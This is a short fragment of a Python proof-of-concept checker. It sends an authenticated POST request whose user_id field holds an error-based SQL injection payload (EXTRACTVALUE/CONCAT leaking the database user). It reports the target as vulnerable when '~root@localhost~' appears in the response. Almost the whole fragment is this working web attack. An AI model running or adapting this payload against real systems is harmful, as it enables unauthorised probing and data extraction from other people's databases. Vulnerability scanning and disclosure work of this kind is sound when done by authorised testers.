...
def check(target):
    ...
    if authen:
        data = {
            ...
            "uid":"1",
            "user_login":"1",
            "user_id":"1' AND EXTRACTVALUE(1, CONCAT(0x7e, user(), 0x7e)) AND 1=1"
            }
        try:
            sqli_resp = requests.post(target+url, headers=headers, data=data, verify=False, timeout=30)
            if '~root@localhost~' in sqli_resp:
                print(f"{target} 存在漏洞")
        except RequestException as e:
            print(e)
